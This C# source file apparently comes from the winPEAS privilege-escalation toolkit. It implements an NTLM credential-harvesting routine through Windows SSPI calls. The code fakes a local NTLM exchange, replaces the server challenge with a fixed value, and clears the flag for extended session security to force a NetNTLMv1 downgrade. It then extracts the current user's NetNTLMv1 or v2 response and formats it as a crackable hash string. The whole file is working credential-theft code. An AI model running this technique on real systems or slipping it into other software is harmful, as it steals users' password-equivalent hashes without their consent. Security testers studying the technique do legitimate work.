using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using winPEAS.KnownFileCreds.Kerberos;
using winPEAS.Native;

namespace winPEAS.KnownFileCreds.SecurityPackages
{
    internal class SecurityPackages
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_INTEGER
        {
            public IntPtr LowPart;
            public IntPtr HighPart;
        };

        private const int MAX_TOKEN_SIZE = 12288;
        private const uint SEC_E_OK = 0;
        private const uint SEC_E_NO_CREDENTIALS = 0x8009030e;
        private const uint SEC_I_CONTINUE_NEEDED = 0x90312;

        internal static IEnumerable<NtlmHashInfo> GetNtlmCredentials()
        {
            var challenge = "1122334455667788";

            var cred = GetNtlmCredentialsInternal(challenge, true);

            if (cred != null)
            {
                yield return cred;
            }
        }

        private static NtlmHashInfo GetNtlmCredentialsInternal(string challenge, bool disableESS)
        {
            var clientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
            var newClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
            var serverToken = new SecBufferDesc(MAX_TOKEN_SIZE);

            SECURITY_HANDLE cred;
            cred.LowPart = cred.HighPart = IntPtr.Zero;

            SECURITY_HANDLE clientContext;
            clientContext.LowPart = clientContext.HighPart = IntPtr.Zero;

            SECURITY_HANDLE newClientContext;
            newClientContext.LowPart = newClientContext.HighPart = IntPtr.Zero;

            SECURITY_HANDLE serverContext;
            serverContext.LowPart = serverContext.HighPart = IntPtr.Zero;

            SECURITY_INTEGER clientLifeTime;
            clientLifeTime.LowPart = clientLifeTime.HighPart = IntPtr.Zero;

            try
            {
                // Acquire credentials handle for current user
                var result = Secur32.AcquireCredentialsHandle(
                    IntPtr.Zero,
                    "NTLM",
                    3,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    0,
                    IntPtr.Zero,
                    ref cred,
                    ref clientLifeTime
                );
                if (result != SEC_E_OK)
                    throw new Exception($"AcquireCredentialsHandle failed. Error: 0x{result:x8}");

                // Get a type-1 message from NTLM SSP
                result = Secur32.InitializeSecurityContext(
                    ref cred,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    0x00000800,         // SECPKG_FLAG_NEGOTIABLE
                    0,
                    0x10,             // SECURITY_NATIVE_DREP
                    IntPtr.Zero,
                    0,
                    out clientContext,
                    out clientToken,
                    out _,
                    out clientLifeTime
                );
                if (result != SEC_E_OK && result != SEC_I_CONTINUE_NEEDED)
                    throw new Exception($"InitializeSecurityContext failed. Error: 0x{result:x8}");

                // Get a type-2 message from NTLM SSP (Server)
                result = Secur32.AcceptSecurityContext(
                    ref cred,
                    IntPtr.Zero,
                    ref clientToken,
                    0x00000800,     // ASC_REQ_CONNECTION
                    0x10,         // SECURITY_NATIVE_DREP
                    out serverContext,
                    out serverToken,
                    out _,
                    out clientLifeTime
                    );
                if (result != SEC_E_OK && result != SEC_I_CONTINUE_NEEDED)
                    throw new Exception($"AcceptSecurityContext failed. Error: 0x{result:x8}");

                // Tamper with the CHALLENGE message
                var serverMessage = serverToken.ToArray();
                var challengeBytes = StringToByteArray(challenge);
                if (disableESS)
                {
                    serverMessage[22] = (byte)(serverMessage[22] & 0xF7);
                }

                //Replace Challenge
                Array.Copy(challengeBytes, 0, serverMessage, 24, 8);
                //Reset reserved bytes to avoid local authentication
                Array.Copy(new byte[16], 0, serverMessage, 32, 16);


                var newServerToken = new SecBufferDesc(serverMessage);
                result = Secur32.InitializeSecurityContext(
                    ref cred,
                    ref clientContext,
                    IntPtr.Zero,
                    0x00000800,       // SECPKG_FLAG_NEGOTIABLE
                    0,
                    0x10,           // SECURITY_NATIVE_DREP
                    ref newServerToken,
                    0,
                    out newClientContext,
                    out newClientToken,
                    out _,
                    out clientLifeTime
                    );

                var clientTokenBytes = newClientToken.ToArray();
                newServerToken.Dispose();

                if (result == SEC_E_OK)
                {
                    return ParseNTResponse(clientTokenBytes, challenge);
                }
                else if (result == SEC_E_NO_CREDENTIALS)
                {
                    return null;
                }
                else if (disableESS)
                {
                    return GetNtlmCredentialsInternal(challenge, false);
                }
                else
                {
                    throw new Exception($"InitializeSecurityContext (client) failed. Error: 0x{result:x8}");
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }
            finally
            {
                clientToken.Dispose();
                newClientToken.Dispose();
                serverToken.Dispose();

                if (cred.LowPart != IntPtr.Zero && cred.HighPart != IntPtr.Zero)
                    Secur32.FreeCredentialsHandle(ref cred);

                if (clientContext.LowPart != IntPtr.Zero && clientContext.HighPart != IntPtr.Zero)
                    Secur32.DeleteSecurityContext(ref clientContext);

                if (newClientContext.LowPart != IntPtr.Zero && newClientContext.HighPart != IntPtr.Zero)
                    Secur32.DeleteSecurityContext(ref newClientContext);

                if (serverContext.LowPart != IntPtr.Zero && serverContext.HighPart != IntPtr.Zero)
                    Secur32.DeleteSecurityContext(ref serverContext);
            }
        }

        private static NtlmHashInfo ParseNTResponse(byte[] message, string challenge)
        {
            var lm_resp_len = BitConverter.ToUInt16(message, 12);
            var lm_resp_off = BitConverter.ToUInt32(message, 16);
            var nt_resp_len = BitConverter.ToUInt16(message, 20);
            var nt_resp_off = BitConverter.ToUInt32(message, 24);
            var domain_len = BitConverter.ToUInt16(message, 28);
            var domain_off = BitConverter.ToUInt32(message, 32);
            var user_len = BitConverter.ToUInt16(message, 36);
            var user_off = BitConverter.ToUInt32(message, 40);
            var lm_resp = new byte[lm_resp_len];
            var nt_resp = new byte[nt_resp_len];
            var domain = new byte[domain_len];
            var user = new byte[user_len];
            Array.Copy(message, lm_resp_off, lm_resp, 0, lm_resp_len);
            Array.Copy(message, nt_resp_off, nt_resp, 0, nt_resp_len);
            Array.Copy(message, domain_off, domain, 0, domain_len);
            Array.Copy(message, user_off, user, 0, user_len);


            if (nt_resp_len == 24)
            {
                return new NtlmHashInfo(
                    "NetNTLMv1",
                    FormatNetNtlmV1Hash(challenge, user, domain, lm_resp, nt_resp)
                );
            }
            else if (nt_resp_len > 24)
            {
                return new NtlmHashInfo(
                    "NetNTLMv2",
                    FormatNetNtlmV2Hash(challenge, user, domain, SubArray(nt_resp, 0, 16), SubArray(nt_resp, 16, nt_resp.Length - 16))
                );
            }
            else
            {
                throw new Exception($"Couldn't parse nt_resp. Len: {nt_resp_len} Message bytes: {ByteArrayToString(message)}");
            }
        }

        public static T[] SubArray<T>(T[] data, int index, int length)
        {
            var result = new T[length];
            Array.Copy(data, index, result, 0, length);
            return result;
        }

        private static string FormatNetNtlmV1Hash(string challenge, byte[] user, byte[] domain, byte[] lm_resp, byte[] nt_resp)
        {
            return
                $"{Encoding.Unicode.GetString(user)}::{Encoding.Unicode.GetString(domain)}:{ByteArrayToString(lm_resp)}:{ByteArrayToString(nt_resp)}:{challenge}";
        }

        private static string FormatNetNtlmV2Hash(string challenge, byte[] user, byte[] domain, byte[] lm_resp, byte[] nt_resp)
        {
            return
                $"{Encoding.Unicode.GetString(user)}::{Encoding.Unicode.GetString(domain)}:{challenge}:{ByteArrayToString(lm_resp)}:{ByteArrayToString(nt_resp)}";
        }

        // source: https://stackoverflow.com/questions/311165/how-do-you-convert-a-byte-array-to-a-hexadecimal-string-and-vice-versa
        private static byte[] StringToByteArray(string hexString)
        {
            var numChars = hexString.Length;
            var bytes = new byte[numChars / 2];

            for (var i = 0; i < numChars; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hexString.Substring(i, 2), 16);
            }
            return bytes;
        }

        private static string ByteArrayToString(byte[] ba)
        {
            var hex = new StringBuilder(ba.Length * 2);

            foreach (var b in ba)
            {
                hex.AppendFormat("{0:x2}", b);
            }

            return hex.ToString();
        }
    }
}
